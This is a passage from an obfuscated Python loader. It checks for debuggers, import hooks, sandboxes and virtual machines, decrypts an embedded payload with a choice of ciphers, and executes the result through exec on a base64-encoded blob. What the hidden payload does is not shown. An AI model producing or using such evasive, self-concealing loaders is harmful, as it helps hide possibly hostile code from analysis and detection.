    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _ovnfaj():
    if _zivrj.gettrace() is not None:
        _zivrj.stderr.write('error: debugger detected\n'); _zivrj.exit(1)
    _adqxeatv = bytes.fromhex("f9e5ddbbc0b1dce1f0bfdfc9e9e5dac7e2cac4e7d8e4d9e3c7d9ecdaebc7d0e3dde4ddcfe6cccdc9decbcbf2c0e1cce5c9c1e9c7dccbc5f1c0bcf0e7c2b1c1eae3eddbbae7d2cdf8cedafbb9deb0f1c3c9dfc9cec7e2fdc5e4ece9c6cad0b8deccfbfadec5d0b0ebf1ffcbddf1defaf9c0fff9dfe7dbd9c6d2b8ecbcc2decfbff1bae1b8f0b1c7d0fce9bbf0cbeddbcad9c3c1b8ebfbd2bbbec0bffefee0d8dacfc4e0cddccec9ffddbccfbbbbe2efcbe4c2b8cedffed9d1d2dbbbccd8c3fcbaddbec0e4d8cce9b1b1b0ede1faf0c7e3cde1bfcfcbe7daf8f9d8e3bdb8cccfcfe9d0fbe1ddcafbcae1debdcbcbc4bcddb0f0c0f9bac2e9daf0fed2cecfd2cffab8e6e1f8e9e0ccfac1b8c4ffe4e5dbbebde2bdcdcdd1f0fdc9bfcee6eec3c3e2f0ddc9dbbcfdc6cbfcfedbd0d0e6ececeafafbffead2d1c5dddbd1c1bcdfc4bac6dfffcdbcc9fec0eac5fdcaf9c2fcdac2bbe1dac6bbfbf2f8b0f8cfcec1ffe9dddefce9c4b0e2efd1e9ebbbc5e5c3edbdcddfe2bbb8fcf2c3e7cbdcc4c1c5dcc2cfcec4fdddfab9d8cefde7bbc7ffd1d2efbbc5c7fbc7cbd0ccbaefc0deefe0dfd1e4ced8bdc2c0daccdadde2b9d2fbc0ecc9f9c0ecfeeecbb0c9b9beeccfd8f9d2c4fce7eefcbad1ffcafbd9bccad1cdcbced2c5e5deefd8dfbce7f8dac0c7b8cdc7c5c6cce1e7c2c4f0eaebc4e6c5b8e6ceffd0eee5f0d2bebef0cdb0eceaecbcdcedddd0fafcd0eee7e6ebe5e0f2f0fdd2e6e7cfd0b1d8edbdcfeee7f9c5cbfbbcc0c6bfddbefac9c0d2e1fcd9eaf0f2d8edd2e1bfe0c6ffeebfbbcbc4cfd9d2e4ecc1e5cfb0f9bfd8dbe1f0e2eae1c0bebeb0d0f0ceb8f1c2e0c0c7fad1cedbc0b9efd9d1c0bafdb8b9ded0f1bedebaf0feddcbd8f9bfb8e3d0ddb1b1d1e5ebbeeef1d0e6cee6e9cfdfc4feedc4d1c0cae5c2bbf8fefac5cadffacececbcbdad1cbe7caecfcbfd8d9f0fec5d9dceceaffedc5d2efeadbeabfdac9c5c0e6c4fdf8feceb0f1fac3edb1e7c4ffdfefdfc3bddcb8e2fec0bab8f0dae9ccc4f2cac7ddf2c2dfd0edc5baede4e5fbb8ccf2fdfceccde3edbffbeae5e9ccdebdffb9fac4e7c9ffbdd1bcb1f2bcd8bdc9e1daffe1dbe6e9fad0bfd2c2f0c4def2bdbbfbf2c3bbe1dfd2f1c3c5eefcfccaccc0ffb9ddd2edf1cfbff0c6c6e4e0d1b0e2c4d0ddd9cfe0eefdfeefd0cce4bbe5e0fcf1cdccdcffdfccb0f9eacddac0b8fee0f9fbc6d9cbefdfe9fcfbe4f1c4d1bde2e9c7fdbfdac9b9b0fcc5f8fcf8d2ccf2ebb8fee5fcfdddfccee1bbcaffcff8fedfc0e4faece1cae4cde9caffe7efcaead9f9dabdd9c1c2facacdbcedc1fcccefe7b0f2b1e0bfc0c3e6dfdaf2e6eeb1cec9d8cddee5efe0f0d9f1cfc0cbc0edcee7f0f1dacbb0dfd8c3cbcccfccfff1fae3b1caddffd1cce9e5e2e7dacbbdc2c7dad2cbd9dccbf2d1c1d8c1cfedd9")
    _adqxeatv = bytes(_ ^ 136 for _ in _adqxeatv).decode()
    _zivrj.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _zivrj.modules:
            _zivrj.stderr.write('error: debugger detected\n'); _zivrj.exit(1)
    _wxzjrehmq = _chxpbxsnz.b64decode(_cdmof)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_zivrj.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _zivrj.stderr.write('error: hook detected\n'); _zivrj.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _tmlfmx, algorithms as _mevsvbif, modes as _gqkuftrm
    except ImportError:
        _zivrj.stderr.write("error: cryptography not installed\n"); _zivrj.exit(1)

    if len(_zivrj.meta_path) > 5:
        _zivrj.stderr.write('error: import hook detected\n'); _zivrj.exit(1)
    if getattr(_zivrj, 'flags', None) and _zivrj.flags.no_user_site:
        _zivrj.stderr.write('error: sandbox detected\n'); _zivrj.exit(1)
    import os
    if any(x in str(_zivrj.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _zivrj.stderr.write('error: virtual machine detected\n'); _zivrj.exit(1)
    if _tmrip == 1:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=80)
        _hgqpl = _qcrfhr[:32]; _xuvfiki = _qcrfhr[32:48]; _hibiqclg = _qcrfhr[48:80]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _jzjymwy = _tmlfmx(_mevsvbif.AES(_hgqpl), _gqkuftrm.CBC(_xuvfiki))
        _ufpeoin = _jzjymwy.decryptor()
        _ufpeoin = _ufpeoin.update(_kgnmbjxzi) + _ufpeoin.finalize()
        _lvongv = _ufpeoin[-1]
        if _lvongv < 1 or _lvongv > 16 or not all(_ == _lvongv for _ in _ufpeoin[-_lvongv:]):
            _zivrj.stderr.write("error: decryption failed\n"); _zivrj.exit(1)
        _ufpeoin = _ufpeoin[:-_lvongv]
    elif _tmrip == 7:
        _ufpeoin = _chxpbxsnz.b32decode(_wxzjrehmq)
    elif _tmrip == 5:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=64)
        _hgqpl = _qcrfhr[:32]; _hibiqclg = _qcrfhr[32:64]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _ufpeoin = bytes(_kgnmbjxzi[i] ^ _hgqpl[i % 32] for i in range(len(_kgnmbjxzi)))
    elif _tmrip == 6:
        _ufpeoin = _chxpbxsnz.b64decode(_wxzjrehmq)
    elif _tmrip == 10:
        _ufpeoin = bytes.fromhex(_wxzjrehmq.decode('ascii'))
    elif _tmrip == 0:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=64)
        _hgqpl = _qcrfhr[:32]; _hibiqclg = _qcrfhr[32:64]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _jzjymwy = _tmlfmx(_mevsvbif.AES(_hgqpl), _gqkuftrm.ECB())
        _ufpeoin = _jzjymwy.decryptor()
        _ufpeoin = _ufpeoin.update(_kgnmbjxzi) + _ufpeoin.finalize()
        _lvongv = _ufpeoin[-1]
        if _lvongv < 1 or _lvongv > 16 or not all(_ == _lvongv for _ in _ufpeoin[-_lvongv:]):
            _zivrj.stderr.write("error: decryption failed\n"); _zivrj.exit(1)
        _ufpeoin = _ufpeoin[:-_lvongv]
    elif _tmrip == 13:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=80)
        _hgqpl = _qcrfhr[:32]; _xuvfiki = _qcrfhr[32:48]; _hibiqclg = _qcrfhr[48:80]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        import struct as _ryeskkon
        def _ijiikube(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_ryeskkon.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_ryeskkon.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_ryeskkon.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _nmaookjcx = _ryeskkon.unpack('<I',_xuvfiki[:4])[0]
        _xuvfiki = _xuvfiki[4:]
        _ncgcsi = bytearray()
        while len(_ncgcsi) < len(_kgnmbjxzi):
            _lvongv = _ijiikube(_hgqpl, _nmaookjcx, _xuvfiki)
            for _fbtqobaup in range(min(64, len(_kgnmbjxzi) - len(_ncgcsi))):
                _ncgcsi.append(_kgnmbjxzi[len(_ncgcsi)] ^ _lvongv[_fbtqobaup])
            _nmaookjcx += 1
        _ufpeoin = bytes(_ncgcsi)
    elif _tmrip == 11:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=64)
        _hgqpl = _qcrfhr[:32]; _hibiqclg = _qcrfhr[32:64]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _lvongv = _hgqpl[0]
        _ufpeoin = bytearray()
        for _nmaookjcx in range(len(_kgnmbjxzi)):
            _ncgcsi = _kgnmbjxzi[_nmaookjcx] ^ _lvongv
            _ufpeoin.append(_ncgcsi)
            _lvongv = _kgnmbjxzi[_nmaookjcx] ^ _hgqpl[ (_nmaookjcx + 1) % len(_hgqpl) ]
            _lvongv = (((_lvongv << 3) & 0xFF) | (_lvongv >> 5)) ^ 0x5A
        _ufpeoin = bytes(_ufpeoin)
    elif _tmrip == 3:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _puyqyc
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _ufpeoin = _wxzjrehmq[16:-32]
        _kgnmbjxzi = _ufpeoin[:-16]; _lvongv = _ufpeoin[-16:]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=76)
        _hgqpl = _qcrfhr[:32]; _xuvfiki = _qcrfhr[32:44]; _hibiqclg = _qcrfhr[44:76]
        _gxtzect = _ugprma.new(_hibiqclg, _ufpeoin, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _ufpeoin = _puyqyc(_hgqpl).decrypt(_xuvfiki, _kgnmbjxzi + _lvongv, None)
    elif _tmrip == 2:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=80)
        _hgqpl = _qcrfhr[:32]; _xuvfiki = _qcrfhr[32:48]; _hibiqclg = _qcrfhr[48:80]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _jzjymwy = _tmlfmx(_mevsvbif.AES(_hgqpl), _gqkuftrm.CTR(_xuvfiki))
        _ufpeoin = _jzjymwy.decryptor().update(_kgnmbjxzi)
    elif _tmrip == 12:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=64)
        _hgqpl = _qcrfhr[:32]; _hibiqclg = _qcrfhr[32:64]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _lvongv = 3 + (_ncgcsi[0] & 7)
        _ncgcsi = bytearray(_kgnmbjxzi)
        for _nmaookjcx in range(_lvongv - 1, -1, -1):
            _ijiikube = (3 + _nmaookjcx) & 7
            _fbtqobaup = (_nmaookjcx * 0x1B + 0x5A) & 0xFF
            for _xuvfiki in range(len(_ncgcsi)):
                _lvongv = _ncgcsi[_xuvfiki]
                _lvongv ^= _fbtqobaup
                _lvongv = ((_lvongv >> _ijiikube) | ((_lvongv << (8 - _ijiikube)) & 0xFF))
                _lvongv ^= _hgqpl[(_nmaookjcx * len(_ncgcsi) + _xuvfiki) % len(_hgqpl)]
                _ncgcsi[_xuvfiki] = _lvongv
        _ufpeoin = bytes(_ncgcsi)
    elif _tmrip == 4:
        _ncgcsi = _wxzjrehmq[:16]; _izdqn = _wxzjrehmq[-32:]; _kgnmbjxzi = _wxzjrehmq[16:-32]
        _qcrfhr = _djqpmb.pbkdf2_hmac('sha256', _adqxeatv.encode(), _ncgcsi, 100000, dklen=80)
        _hgqpl = _qcrfhr[:32]; _xuvfiki = _qcrfhr[32:48]; _hibiqclg = _qcrfhr[48:80]
        _gxtzect = _ugprma.new(_hibiqclg, _kgnmbjxzi, digestmod='sha256').digest()
        if not _ugprma.compare_digest(_izdqn, _gxtzect):
            _zivrj.stderr.write("error: integrity check failed\n"); _zivrj.exit(1)
        _jzjymwy = _tmlfmx(_mevsvbif.ChaCha20(_hgqpl, _xuvfiki), mode=None)
        _ufpeoin = _jzjymwy.decryptor().update(_kgnmbjxzi)
    elif _tmrip == 9:
        def _nvoecuvp(_wthge):
            if _wthge[:2] == b'<~': _wthge = _wthge[2:]
            if _wthge[-2:] == b'~>': _wthge = _wthge[:-2]
            _tqwrp = bytearray(); _utmikgig = 0
            while _utmikgig < len(_wthge):
                if _wthge[_utmikgig] == 122:
                    _tqwrp.extend(b'\x00\x00\x00\x00'); _utmikgig += 1; continue
                _tvhjbl = 0; _wbvsw = 0
                while _utmikgig < len(_wthge) and _wbvsw < 5:
                    _tvhjbl = _tvhjbl * 85 + (_wthge[_utmikgig] - 33); _utmikgig += 1; _wbvsw += 1
                _ybmtrjli = _wbvsw - 1
                if _ybmtrjli > 0: _tqwrp.extend(_tvhjbl.to_bytes(4, 'big')[4-_ybmtrjli:])
            return bytes(_tqwrp)
        _ufpeoin = _nvoecuvp(_wxzjrehmq)
    elif _tmrip == 8:
        _pusdbnvy = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _feglwsic = {c:i for i,c in enumerate(_pusdbnvy)}
        def _bqxrcyh(_kqthfkdzn):
            _mjffql = bytearray(); _cheml = 0
            while _cheml < len(_kqthfkdzn):
                _nbpgfpnwb = 0; _pilznkowy = 0
                while _cheml < len(_kqthfkdzn) and _pilznkowy < 5:
                    _nbpgfpnwb = _nbpgfpnwb * 85 + _feglwsic[chr(_kqthfkdzn[_cheml])]; _cheml += 1; _pilznkowy += 1
                _deqopsxvg = _pilznkowy - 1
                if _deqopsxvg > 0: _mjffql.extend(_nbpgfpnwb.to_bytes(4, 'big')[4-_deqopsxvg:])
            return bytes(_mjffql)
        _ufpeoin = _bqxrcyh(_wxzjrehmq)
    else:
        _zivrj.stderr.write("error: unsupported algorithm\n"); _zivrj.exit(1)
    _vk = bytes.fromhex("40085de52ef6ed340d67f05844901bdbc184f35eabab3279f3ac52280bba31f1")
    _vn = bytes.fromhex("595f198bf3701d00561830ae7741bdd2")
    _sig = _ufpeoin[-32:]
    _pl = _ufpeoin[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _zivrj.stderr.write('error: VM integrity check failed\n'); _zivrj.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _ufpeoin[1] == 1:
        import zlib as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 2:
        import lzma as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 3:
        import bz2 as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 4:
        import brotli as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 5:
        import zstandard as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 6:
        import gzip as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 7:
        import lz4.frame as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 8:
        import snappy as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 9:
        import gzip as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    elif _ufpeoin[1] == 10:
        import blosc as _zoksdyvm
        _pd = _zoksdyvm.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_chxpbxsnz.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCdtalpmMzd2bjBJVFZQMWZvQ1NGOUZpallxVVR3QTdZWlcwaFhTeUFtUERFPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnTHFiQkFsd1IrNW0zRVRmd0VhUmhFbGZoODdiYzk5N20zTlVpaDJqTGZ6YkoxQkFFWUYzdGNISWNJckNWbTVOMjZrMVNmYkpETWJQeVAyK0xqREhWY0p5ZU5GSWU1MlhGMGVIM3JvejdsczdNei80YmNXaDUvRkRLa2hpYmdUOW5yaDU5ZWdzUFdlczFacFZ0dlVxZFQyRFBKQ1NjNDlGUjZKTSsxV0kyZUZnUUtsMDBZTkNYNHNIWUxONHB1WllRUHhuQkFDNHlhOE5Ba05iNTRrRFRFYXZlREpRQUdaZmpmY1B0QlRhVTVWMDBkVmNFUGhnRHU5QjBCdjlzUThGTWxEcG9IL0QwSVhwaXhrWVJkbVNLejBmSHd4eUY3R2RpWEYwN3pwSGFiMHpwQm9LNTgxdXhRUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ1pSaEc2OERucVlMTGpFb3Nqd1B3Mlp5ZHFJbEZFV2hvWmZ0YVdzTGU2cnJwbGxSd1I3N2tTaFllb0dVNzh2SUZLaWxlOVRFZXRIeUZwMGdNTW85OURId0lHUG9rSUJNenlObkJXY0xMOVB5bG41VURDRTJNVXEvVUZtWmNyVm5qb29GQjRBVklpV1d1dUhJSzhhQjhTTUVIK242ZmpNeGsrNFh3SHpyNXdVVW14VldKaFV5dkIveWxSTEFwRDhjK252RkptU2RWdm9IMHJZUWNSZUhSS3JvYmlMbjBSeldFTGxReGd5SjVFazY4YUhFS2NDWXJVM1djRVMrUUVHYlBmaEpBSXloV1c1YUNLMm5zblY1c2MrQTBweDAxUzc1dUhYSXY5ckllc3kwPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdyS21IQWNReDJHcWlVa3d6Nmxxbk1ycDVieHIzOEZCYUcwcG92MDg5UmhhN0NPME5vK1djU2hpMUtOU3NmbHJGVlVQTFhETDUwR0xHSW5PV2VVb1B4VnhrVGRESVVNYW1uNGlBSnZ1ZWxLS1h1RGlodlpEY2xPa3FFcXVqaDB5dlBlMlQvM3QrbitORUtjY1VjOHd1QnNlSzZrUWxWb3AwNkhlQ1NsTHZqUmh6SERjMUJqbE9IbmNWTnowTzU5Z0xnL09Hc0xFVmdLOUk4aU84Q1Z2VWt3RVcwQ0Y2WXhzbXR1eGVCNVQyQXJkMkdhcDVuQkQzY0lnVmVwOURBeEdRcWw2c3d2RGMrbEVCV28wdkw5MWlObEVpZTY0dDJRZEwzTkZ3cDE5TkNNZUZtc29OTjB3aDVMcWZOcDNLSVBKQ3VUMDRhd0Z0azQ3dVlvRmtULzVpanpIUHlFaz0nKSwgYmFzZTY0LmI2NGRlY29kZSgnaW56MGlwckpucWUydVplRFRBTk96dmdSYVdHTnRNNTNONFQzQ1MrajBrWmc0ZkNMTVhnZU1rSVhlMlEvQ2ZFWjQ1eUk2RDR2QXFNcEQ5eGtjRE1tVC9UOHZyY0NvY2JDUVJvSXlvbEdLUmlGVDRFOFZwOHBsRUI2NlA5YXBvUWFQNTMwY1QwWWhXOFRibWFYZTBFcTV6MGtnVDJYSW80MlVha2RNTFpqeWd3Zy9QNU1VS2tCNGZFZ212WnNqdk01WElTTTZPdXZiRXBwdmYyb0Q0NFlpcXRLZ3J2eDE0aGhvQml2YytOZ3hRUUMxYlVPV1JqUHllNzJ5RlluQktFTjVrTHROZ2V5S2tybHpLYkZVQXRJeVAwK0I1QnYrTGVnckZrNisrbXRaNnFoeDFYVytVbk5CMmd4RFhaTTdNcTdLU0FFSUxRdlpFMUZEOWFUSG44YkNrR3dKOFhZR1dXUVd1dXhESDNrTE5sMGxMUWRNOG96dEY4bjFCK2hGV0RFMXAwK3R6Z3lwUklIR0FDN3BHa0VXelkrSzJHLzMxbjBoZ3lmSVZ4eTBPYUpScWZ4dGF5T08wY3d2ei9CK0xlZS85UFd6R2JHWWRGd3lSdVZJbGtMZE5keDhub3NnSlZRU3FRWlI3QVlXOFNQd1B6cjB2aDE3OTJ6eGVGTmovczNqMU83ZnlPOWlWbXJnVElNaGZ0RkdSQnNqZzNBQ0U0a0U2L0lVSGVJdHRRUmVzQUhaVVRGdyswQXg2VXNraUNtQk81VjhITlk3Q2szeHlMcllGWUFvWWtld3M4Z3krUFFPSHQvSVpGd20zSlZtOUdTeU9vUXNYT3doUlhKTEdkSlo0dGttMkhuRVNTZzl3ai9mV29vK0lwSlJHWkNvYnhlcWtwNVloaC9FeXViYUhLVE40dWF1VnlqZDV3NHBRMzE4bURrc0dSUlB4R2JnWGtZSnhTL01iUW9XQ0M3VUJIL2tHTlVIeGUvN3oreTcwbGlRVUhMYnJ1RjBhbzVERjFwdjRFalFUUkxVTHZlN2lpdzdhbjJKd0dvWkVYV0RyaWNCekJSdm1qSHdIYXJKUmVHSUxwcEhlLysrcDczRWZOTVBSRmgwUFMwMlFDTlJVeXAwVHhuNDVxMndWMWlMZkNEbVBsN0tmZXgzeVZsV0dXQnF6OFg4K0NMdjBQRVo1UkdZV3B2NXAyZDFWUzE5NlZ4MDhrQUs4NmlkdXdqNmxEdDJ2TEE5eTZ6RlplekRWRmJLem1hTWhsUzYrSnl6Nmx1bG5qUEI0RFA2TGliT29PcDJkd24yekozaEFUb0h6WVhMN2pkM1NlMHNLT21UcGxNSkZOTFI5YUtKVytKUmJvU2lLQURKdzVERUE3c3hIVU5BTWpnK3JzeDZJd2lQYTVGcmpvWFdtbjZKaitjOVJCQWlwc1ViMlpCakNXT3hPMGFFanZwSkJGMTlnVVZOWWhXaHBtSDZkSHBoWGdCZnk1VjRsajBpTTNyd0IzVTEvTEMzKzlGSWZzN0U5TFV4UXZ5Wi94cThKdVZTVU9BWWczV0ZOblNCSE9xUlpSUS9LZnRzR1p2alZWU1U0WWEyN055a0NjY01LN3MxVTRLa0Q4a251T3h0d2szbm50VkZyTEdlRlhrb205b0JDZm1US1NwWk5xZFF6R0d4VGM1Mm80Y3ZhS1A2dWhUVzVFcmFUSVpad1VJYmFUaTlYL2hLVlRTNDJwNXFNT0J2QnFhTVp6MHhibWo5MS9aSDE2aktpZit1b2xNR0NrakVCa1BISko2SVFmSDhzOWhtNHo3bU5VbXNPNElwNzhIYlZ5dzZpYmZtSkFwVGdDYkh3TUNNWWdTbGsvQzhHZUMvVTFTanlOckExVVc3L2Z0aVF5bEdpN2tVYjJ3RWlRQ0Y1MG15YU10dk4wUmpBMnZVazZxK29PeE12WFNPWWFtaWRuZXorQjA5M3BJRElUcHcxZGFEc1YzRmtXMFNYRHlTUVlZRzFqMzVzRCtSeTdOcElqUlEyZVEvYWdHYVROYTltaHlPTTRibGZJY2NTTDQvaW95OW1UdUNzRDZNWWgxZnY2VlNjeEJnMW4rV2Q0dXBEN1RFVE9LKzBkSzlmRjNVblpDRk9qOTdQQVJKb1R2a2FlRDFFS3p3VkVaVDlLVXBjTkFDeXhVVmdBTVdhTEtLQVc2U0xFakIzRnd2bXhxbHNnbHJDMkp6eUlXamJGbkFzcHdBa1F4bXBmWGE5cGZGWnNoVmpHVjZCWW9BRlVIcmlCT2kyenJVS2dBUTh1UmEyVGtKSmRYZ0tYNGpHc0NyVGt1eFp5OWhyVFVmU0tpNFJvZUdXVUtEVGNZTWJmT2VjZzVuMXVaekhyTlk2U0xhSlJSQ0VjaGplMVNaV3RCQVYyUEt0cnFiWnRtbUhyMm9WQkF0ZklUV2Voais3dFZkbTJYWXYxaEozaGcrd1BuQ0pEUE9TdkdrcUdlcmlrK1ZUeHVjcGhyZGpEN3pRYUdzT0dEOGpLSndsOGtDNy9INW1kUmliOHlQa1RkbFAvcHVZbWlLaCtiSzd2bFh0QTRCZGhyblQ5d0lwWlBZMUhjem9Ic3NrSEI1Y1Q5bURlOUphZFRtMkNBTTRYakRIYXpFOFJWdFJYZFVOMFliSkpVM1U1cU5seEQ5cTNUQmJoQ3grNUlBSWltMUF5Ky9vR2NwQ244Z1NWLzBXNDEwZjlEeWJPOXVodWxNSEFBWHpUTDdYbDRkbGo3UnZSQ3BhTFR3ajdiNUw2MlJCdHR5MlhES3FSbWMxNFBLRDRsMWN1VmRjZkFKT1NsL2NLYVlnRjVBZStMaXZWN21mbUZ6YnlMNnlSM1pOeFRwRkxoRXBubHFmRENIcU5qWjMrZTY1ZkFpVDgrNDZpNTdsS1lqc0pLS0kyUG5YYVpnMURRSUZKdzJRbDBnTEFoUlV3OUxUUHRNQU9Mb1lnSEprUzZncXBRWXFjYUZ6Vngva0g5OEVHNDJJOC9iN0xrdTNpRU9sSkNFVjNoM0x0d1ZoTHBrTmc1b3d1RWtCbW1Zb2ZXc0RKNE81cXpTVG91K1l0Yk8wMXBzdSs1VFVPNkJmKzM3NUdZeWhBNmxkZFkxeWFyVTkrTDJPWUpoS0JXbkdZS2V2VWxYUWNLVTJUaE5POXZtMmVmbC82TXo4eTZmRFN5ZjlhY1B4Z3ZFRC9maDdMQ1FIRXkvQlJDdlEza0dXZTVYNThFQ01TeFUvSWMvYnpIMC9HUVhyUHZKWnFDMHc0UmZjbkk5T0JkMUxleThQYTM5cEh2eUt4YzZUbGJ6YndCMUhTdk93TS8zTDNVNDBiWXFDSWNjN3E1N0VrVGZ6Q0ZwK05SRytqZ3pMT1BjR3dBRVJCdkRtTDIwMTk5eURKYndQdUFkVXVFZVRYdlNSTG1JRjgvc2tpMnZXdStEdHpMSXFySWIrUWhUeW5FN3daVWtrL2VQTk4wMits